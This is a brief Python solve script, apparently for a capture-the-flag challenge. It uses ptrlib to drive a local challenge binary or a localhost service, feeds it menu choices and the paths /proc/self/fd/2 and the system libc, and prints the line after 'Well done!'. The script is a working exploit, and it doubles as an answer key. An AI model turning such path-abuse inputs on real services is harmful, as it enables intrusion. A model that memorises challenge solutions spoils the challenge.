from time import *
from ptrlib import *
from subprocess import getoutput
from sys import argv

is_remote = len(argv) >= 2

if is_remote:
  print('run remote')
  p = Socket('localhost', 8190)
else :
  print('run local')
  p = Process('./chal', cwd='../challenge/')

p.sendline('1')
p.sendline('/proc/self/fd/2')
p.sendline('1')
p.sendline('/lib/x86_64-linux-gnu/libc.so.6')
p.sendline('2')
p.sendline('0')
p.sendline('1')

p.recvuntil('Well done!\n')
print(p.recvline())
